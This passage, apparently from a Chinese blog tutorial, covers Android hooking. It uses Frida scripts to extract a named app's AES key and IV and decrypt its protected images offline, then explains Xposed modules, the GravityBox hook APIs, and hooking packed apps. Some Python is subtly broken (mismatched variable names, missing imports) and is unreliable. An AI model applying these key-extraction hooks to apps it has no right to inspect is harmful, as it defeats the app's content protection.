image:</span><br><span class="line">            ival = <span class="built_in">int</span>(m)</span><br><span class="line">            <span class="keyword">if</span> ival &lt; <span class="number">0</span>:</span><br><span class="line">                ival += <span class="number">256</span></span><br><span class="line">            intArr.append(ival)</span><br><span class="line">        bs = <span class="built_in">bytes</span>(intArr)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 根据 uuid 生成文件名</span></span><br><span class="line">        fileName = <span class="built_in">str</span>(uuid.uuid1()) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fileName:&quot;</span>, fileName)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="comment"># 写入字节流</span></span><br><span class="line">        f.write(bs)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 获得最上方的应用</span></span><br><span class="line">target = device.get_frontmost_application()</span><br><span class="line">session = device.attach(target.pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hookBitmap.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 错误处理</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><p>&emsp;运行saveBitmap.py后，再对图片进行刷新，就可以下载图片啦。但是！<code>我们目的不是为了下载图片，而是为了分析协议，也就是对如何对图片进行的解密</code>。</p><p>&emsp;我们使用objection hook decodeByteArray并打印调用栈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.graphics.BitmapFactory.decodeByteArray &quot;[B, int, int, android.graphics.BitmapFactory$Options&quot; --dump-backtrace </span><br></pre></td></tr></table></figure><p>&emsp;发现业务层代码<code>com.ilulutv.fulao2.other.helper.glide.b.a</code>。使用jeb找到此函数，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010201958270.png" alt="image-20231010201958270" style="zoom:67%;" /></p><p>&emsp;跟进解密函数，其中arg3为密钥Key，arg4为向量IV，arg5是要解密的数据。</p><p><img src="/images/frida-reverse-analysis-2/image-20231010202233421.png" alt="image-20231010202233421" style="zoom:67%;" /></p><p>&emsp;因此，可以使用主动调用的方式对key与IV进行获取，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getKey.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getKey</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CipherClient</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.idik.lib.cipher.so.CipherClient&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> key = <span class="title class_">CipherClient</span>.<span class="title function_">decodeImgKey</span>()</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="title class_">CipherClient</span>.<span class="title function_">decodeImgIv</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key, iv)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;获取到key与IV之后，采用rpc的方式来模拟，从而实现最终的脱机抓取图片数据。经过分析，前面抓包得到的图片数据其实是<code>com.ilulutv.fulao2.other.i.b.a</code>函数的返回值，因此可以写脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// final.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_image_ciphertext</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ilulutv.fulao2.other.i.b&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> a_func = b.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>)</span><br><span class="line">        a_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">a</span>(obj)</span><br><span class="line">            <span class="title function_">send</span>(result)</span><br><span class="line">            <span class="keyword">return</span> result            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># final.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IMGdecrypt</span>(<span class="params"><span class="built_in">bytearray</span></span>):</span><br><span class="line">    key = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;xxxx&quot;</span>    </span><br><span class="line">    imgkey = base64.decodebytes(<span class="built_in">bytes</span>(key), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    imgiv = base64.decodebytes(<span class="built_in">bytes</span>(iv), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(imgkey, AES.MODE_CBC, imgiv)</span><br><span class="line">    msg = cipher.decrypt(<span class="built_in">bytearray</span>)</span><br><span class="line">    <span class="keyword">return</span> msg                      </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        image = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        intArr = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> image:</span><br><span class="line">            ival = <span class="built_in">int</span>(m)</span><br><span class="line">            <span class="keyword">if</span> ival &lt; <span class="number">0</span>:</span><br><span class="line">                ival += <span class="number">256</span></span><br><span class="line">            intArr.append(ival)</span><br><span class="line">        bs = <span class="built_in">bytes</span>(intArr)</span><br><span class="line">        bs = IMGdecrypt(bs)</span><br><span class="line">        <span class="comment"># 根据 uuid 生成文件名</span></span><br><span class="line">        fileName = <span class="built_in">str</span>(uuid.uuid1()) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fileName:&quot;</span>, fileName)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="comment"># 写入字节流</span></span><br><span class="line">        f.write(bs)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 获得最上方的应用                                  </span></span><br><span class="line">target = device.get_frontmost_application()</span><br><span class="line">session = device.attach(target.pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;final.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 错误处理</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="0x04-Xposed-Hook及主动调用与RPC实现"><a href="#0x04-Xposed-Hook及主动调用与RPC实现" class="headerlink" title="0x04 Xposed Hook及主动调用与RPC实现"></a>0x04 Xposed Hook及主动调用与RPC实现</h2><p>&emsp;Xposed 是 Frida 的前辈，其作为<code>系统框架类型的 hook 思想</code>对安卓安全研究有很大的影响。EdXposed 是 Xposed 的后续产品。本章主要介绍 Xposed 基本使用，并与 frida 做对比。</p><h3 id="Xposed-应用-hook"><a href="#Xposed-应用-hook" class="headerlink" title="Xposed 应用 hook"></a>Xposed 应用 hook</h3><h4 id="Xposed-安装-amp-Xposed插件（模块）"><a href="#Xposed-安装-amp-Xposed插件（模块）" class="headerlink" title="Xposed 安装&amp;Xposed插件（模块）"></a>Xposed 安装&amp;Xposed插件（模块）</h4><p>&emsp;需要在 Root 环境下通过 XposedInstaller App 安装对应系统的 xposed 框架，安装成功后，接着安装相应的 hook 框架并重启，从而完成对目标进程的 hook。xposed 本质上是替换安卓系统中的 zygote 与libart.so 库，来将 XposedBridge.jar 注入到应用中，从而实现进程的 hook。安装 xposed 需要满足：安卓版本小于等于7.1，系统 root。</p><p>&emsp;经过一番周折，终于将 Xposed 安装上了。</p><p>&emsp;Xposed插件以App的形式安装到系统中。举一个xposed插件（app）的例子，以说明xposed插件的开发流程。</p><p>（1）修改AndroidManifest.xml，在application节点下增加meta-data属性：</p><p><img src="/images/frida-reverse-analysis-2/image-20231019184544598.png" alt="image-20231019184544598" style="zoom:67%;" /></p><p>（2）在app目录下新建assets目录，并新建xposed_init文件，文件中填入Xposed模块入口类的完整类名，在此为：<code>com.roysue.xposed1.HookTest</code>。</p><p>（3）MainActivity.java中填入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.xposed1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AppCompatActivity 用于构建兼容的 Android 应用程序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">// 设置 activity_main.xml 为当前布局</span></span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 在当前布局中寻找 button</span></span><br><span class="line">        button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 在屏幕底部提示消息</span></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, toastMessage(<span class="string">&quot;我未被劫持&quot;</span>), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toastMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;若没有hook代码，那么打开此插件后，会提示<code>我未被劫持</code>。下面，我们hook的目标为：<code>打印toastMessage函数的参数，并且修改返回值为&quot;你已被劫持&quot;</code>。那么该如何做咧？</p><p>（1）之前，在xposed_init中写入了<code>com.roysue.xposed1.HookTest</code>，从而指定了hook相关的类。我们要在此类中实现<code>IXposedHookLoadPackage</code>接口。之后，每个由Zygote孵化出的进程启动时都会调用接口中的<code>handleLoadPackage</code>函数。如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.xposed1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他的 import 在此先省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookTest</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 函数逻辑 logic-1 在此先省略</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他函数在此先省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;如果想要hook指定进程，就需要对上述代码中的loadPackageParam进行过滤。loadPackageParam中包括一些成员变量，如下所示：</p><div class="table-container"><table><thead><tr><th>成员变量类型</th><th>成员变量名</th><th>含义</th></tr></thead><tbody><tr><td>String</td><td>packageName</td><td>包名</td></tr><tr><td>String</td><td>processName</td><td>进程名</td></tr><tr><td>ClassLoader</td><td>classLoader</td><td>进程的类加载器</td></tr><tr><td>ApplicationInfo</td><td>appInfo</td><td>其他信息</td></tr></tbody></table></div><p>&emsp;通常使用packageName进行过滤。</p><p>（2）锁定目标进程后，接下来对目标进程的函数进行hook，其中需要使用xposed相关的类：<code>XposedHelpers</code>。此类中提供了java类、类成员的接口函数。在此例中，需要使用此类中的<code>findAndHookMethod</code>函数。此函数参数为：要hook函数所在类的handle、函数名、函数参数列表、hook回调类<code>XC_MethodHook</code>。在将<code>XC_MethodHook</code>作为参数传给<code>findAndHookMethod</code>之前，需要实现抽象回调函数：<code>beforeHookedMethod</code>与<code>afterHookedMethod</code>。顾名思义，不必多说。</p><p>&emsp;因此，可以完善 logic-1，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打印 hook 日志</span></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="comment">// log 日志</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 packageName 进行过滤</span></span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.roysue.xposed1&quot;</span>))&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;has hooked!&quot;</span>);</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;inner&quot;</span> + loadPackageParam.processName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.roysue.xposed1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="comment">// 使用 findAndHookMethod 来 hook 函数</span></span><br><span class="line">    XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;toastMessage&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">oldText</span> <span class="operator">=</span> (String) param.args[<span class="number">0</span>];</span><br><span class="line">            Log.d(<span class="string">&quot;oldText&quot;</span>, oldText);</span><br><span class="line">            param.args[<span class="number">0</span>] = <span class="string">&quot;您已被劫持&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;在Xposed Installer中激活此插件（模块），并重启系统。最终可以得到：</p><p><img src="/images/frida-reverse-analysis-2/image-20231019193235633.png" alt="image-20231019193235633" style="zoom:37%;" /></p><h4 id="Hook-API-详解"><a href="#Hook-API-详解" class="headerlink" title="Hook API 详解"></a>Hook API 详解</h4><p>&emsp;本节介绍了被大量使用的Xposed插件（模块），即GravityBox。通过此插件，对Xposed的hook相关API作进一步介绍。<code>GravityBox可以修改状态栏、锁屏、电源等</code>，源码在<a href="https://github.com/GravityBox/GravityBox">此</a>下载。</p><p>&emsp;GravityBox的分析路径如下：</p><p>（1）打开xposed_init，发现其中为：<code>com.ceco.r.gravitybox.GravityBox</code>。找到此类，此类实现了IXposedHookZygoteInit与IXposedHookLoadPackage的接口，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GravityBox</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookZygoteInit</span>, IXposedHookLoadPackage &#123;</span><br><span class="line">    <span class="comment">// 其中代码 logic-2 省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;在此类中，有函数initZygote，用于在Zygote进程启动时执行（每次开机执行一次），正常使用中，initZygote用于初始化工具类。在GravityBox类中，重写initZygote函数，用于初始化配置文件（initZygote重写后调用XSharedPreferences）、打印关键信息，如下所示（logic-2）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 其它函数</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initZygote</span><span class="params">(StartupParam startupParam)</span> &#123;</span><br><span class="line">    <span class="comment">// 其它逻辑</span></span><br><span class="line">    MODULE_PATH = startupParam.modulePath;</span><br><span class="line">    <span class="keyword">if</span> (XposedBridge.getXposedVersion() &lt; <span class="number">93</span>) &#123;</span><br><span class="line">        <span class="comment">// 初始化配置文件</span></span><br><span class="line">        prefs = <span class="keyword">new</span> <span class="title class_">XSharedPreferences</span>(prefsFileProt);</span><br><span class="line">        <span class="comment">// 其它逻辑</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 其它逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其它逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (startupParam.startsSystemServer) &#123;</span><br><span class="line">        <span class="comment">// 打印关键信息</span></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;GB:Hardware: &quot;</span> + Build.HARDWARE);</span><br><span class="line">        <span class="comment">// 其它逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其它逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其他函数</span></span><br></pre></td></tr></table></figure><p>&emsp;在logic-2中，还有一个重要的函数，即handleLoadPackage，此函数是进程启动时被调用的函数，作用为<code>完成java函数的hook工作</code>，其调用时机早于Application.onCreate函数。此函数中有很多if语句，以区分启动的app，从而在一个xposed模块（插件）中hook多个应用。代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> &#123;</span><br><span class="line">    <span class="comment">// 其余逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(SystemPropertyProvider.PACKAGE_NAME)) &#123;</span><br><span class="line">        SystemPropertyProvider.init(prefs, qhPrefs, tunerPrefs, lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(ModLowBatteryWarning.PACKAGE_NAME)) &#123;</span><br><span class="line">        ModLowBatteryWarning.init(prefs, qhPrefs, lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 其余逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(ModStatusbarColor.PACKAGE_NAME)) &#123;</span><br><span class="line">        ModStatusbarColor.init(lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其余逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;以<code>控制系统状态栏颜色</code>为例，跟踪ModStatusbarColor.init函数，发现其对函数的hook都是使用XposedHelpers类进行处理（使用类中的findAndHookMethod函数）。分析ModStatusbarColor.init函数代码，可以得到以下结论（分析过程略）：</p><ul><li><p>在afterHookedMethod或beforeHookedMethod函数中，使用<code>param.thisObject</code>即可拿到被hook函数的实例对象。</p></li><li><p>frida中获取实例对象的成员值，为<code>实例对象.成员名称.value</code>，而在xposed中为<code>XposedHelpers.get&lt;type&gt;Field(实例对象,成员名称)</code>，也有对应的<code>set&lt;type&gt;Field</code>方法。</p></li><li><p>frida中需要使用java.cast来完成类型的转换，而xposed本身就是java的，所以强制转换即可。</p></li></ul><p>&emsp;再来看GravityBox的ModAudio.java部分代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 其余逻辑</span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;android.media.AudioManager&quot;</span>, classLoader, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objService</span> <span class="operator">=</span> XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;getService&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">mApplicationContext</span> <span class="operator">=</span> (Context) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mApplicationContext&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (objService != <span class="literal">null</span> &amp;&amp; mApplicationContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;disableSafeMediaVolume&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 其余逻辑</span></span><br></pre></td></tr></table></figure><p>&emsp;可以看出，xposed还可以钩取类的构造函数，此时findAndHookConstructor无需传递函数名称。</p><p>&emsp;因此，可以说：<code>针对app中的类、函数、变量的处理都是通过XposedHelpers类中提供的函数实现的</code>。那么XposedHelpers是如何实现这些功能的呢？答案是用<code>java的反射</code>实现的。以XposedHelpers的getBooleanField为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">getBooleanField</span><span class="params">(Object obj, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> findField(obj.getClass(), fieldName).getBoolean(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">findField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> findFieldRecursiveImpl(clazz, fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    fieldCache.put(fullFieldName, field);</span><br><span class="line">    <span class="keyword">return</span> field;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">findFieldRecursiveImpl</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;Frida与Xposed对比：Xposed可以在一个函数中完成针对所有进程的hook，在zygote重新启动后生效。而frida是单进程级别的hook。</p><h4 id="Xposed-Hook加固应用"><a href="#Xposed-Hook加固应用" class="headerlink" title="Xposed Hook加固应用"></a>Xposed Hook加固应用</h4><p>&emsp;对加固应用进行hook时，如果直接hook应用中的函数，则会提示ClassNotFoundException，同样，使用frida在spawn模式下对加固应用进行hook时，也会提示相同错误（但是frida使用attach进行hook时为什么不提示咧？）。</p><p>&emsp;答案是：时机不对，即类加载器ClassLoader在加固应用启动时切换，从而导致上述情况。具体而言，app中的类都是对应的ClassLoader加载到ART虚拟机中的，如果ClassLoader不正确，那么就无法找到对应的类。<code>当加固应用启动时，app的当前ClassLoader会发生切换，故而出现上述情况</code>。                      </p><p>&emsp;那么，如何让xposed在面对加固应用时也可以使用attach注入进程呢？</p><p>&emsp;我们来分析这个问题，首先，xposed注入进程的时机不可更改，即zygote启动时，此时app的Application类并未加载，也就导致用于加载app的业务相关的类的ClassLoader未出现。但是，我们可以<code>手动切换ClassLoader</code>。 